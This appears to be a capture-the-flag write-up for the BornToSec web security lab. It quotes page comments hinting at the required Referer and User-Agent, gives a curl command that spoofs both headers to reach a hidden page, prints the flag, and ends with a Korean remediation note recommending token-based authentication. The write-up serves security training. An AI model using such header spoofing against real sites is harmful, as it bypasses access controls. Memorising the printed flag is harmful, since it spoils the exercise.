@@ -1,0 +1,21 @@
+<a href="?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"><li>© BornToSec</li></a>
+
+<!--
+You must cumming from : "https://www.nsa.gov/" to go to the next step
+--><!--
+
+<!-- Let's use this browser : "ft_bornToSec". It will help you a lot. -->
+
+
+curl -o result.html -s --referer https://www.nsa.gov/ --user-agent "ft_bornToSec" "<your_ip_address>/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"
+
+cat result.html | grep flag
+
+<center><h2 style="margin-top:50px;">
+The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+-서버는 유저를 신뢰하는 데 referer와 user-agent에 의존하지 말고 암호화 된 토큰 (JWT 등)을 통해
+올바른 유저인지 제대로 인증해야 한다.
+
+https://velopert.com/2389
+https://yonghyunlee.gitlab.io/node/jwt/
